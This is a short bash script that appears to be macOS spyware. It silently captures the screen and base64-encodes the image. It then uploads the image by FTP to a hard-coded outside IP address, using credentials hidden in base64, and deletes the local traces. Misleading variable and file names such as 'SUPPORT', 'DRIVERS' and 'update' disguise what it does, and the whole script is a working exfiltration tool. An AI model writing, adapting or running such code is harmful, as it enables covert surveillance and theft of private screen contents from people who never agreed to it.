#!/bin/bash
SUPPORT=$(openssl base64 -d <<< czRwNHJwNCQkYzBkPQo=)
USER=$(openssl base64 -d <<< dXNlcnVwZGF0ZUBtYWdpY2V2aWxhcC5sdGQK)
DRIVERS=$(openssl base64 -d <<< MTA0LjIxOS4yNDguODcK)
screencapture -x -C -tgif error
openssl base64 -e -in error -out update
rm -rf error
UPDATENAME=\"$(date +\"%Y%m%d%H%M\")update\"
ftp -i -r 60 -n $DRIVERS << END_SCRIPT
quote USER $USER
quote PASS $SUPPORT
put update
rename update screenz/$UPDATENAME
quit
END_SCRIPT
rm -rf update
exit
